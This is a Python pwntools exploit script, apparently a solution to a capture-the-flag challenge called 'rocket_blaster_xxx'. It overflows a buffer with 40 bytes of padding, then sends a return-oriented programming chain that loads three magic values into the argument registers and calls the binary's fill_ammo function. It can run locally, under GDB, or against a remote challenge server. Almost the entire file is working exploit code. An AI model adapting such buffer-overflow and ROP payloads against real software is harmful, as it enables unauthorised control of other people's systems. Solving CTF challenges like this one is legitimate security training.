#!/usr/bin/python3
from pwn import *

# Set up the target binary by specifying the ELF file
elf = context.binary = ELF("rocket_blaster_xxx")

# Defining the GDB script that will be used when running the binary
gs = '''
continue
'''
# Launch the binary with GDB, without GDB or REMOTE based on the command-line arguments
def start():
    if args.REMOTE:
        return remote("83.136.251.235", 57283)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

io = start()

#=======================================================================================

pop_rdi = 0x40159f
pop_rdx = 0x40159b
pop_rsi = 0x40159d
ret = 0x40101a;

io.sendlineafter(b">> ", b"A"*40 + p64(ret) \
                         + p64(pop_rdi) + p64(0xdeadbeef) \
                         + p64(pop_rsi) + p64(0xdeadbabe) \
                         + p64(pop_rdx) + p64(0xdead1337) \
                         + p64(elf.sym.fill_ammo))

#=======================================================================================

# Interact with the process
io.interactive()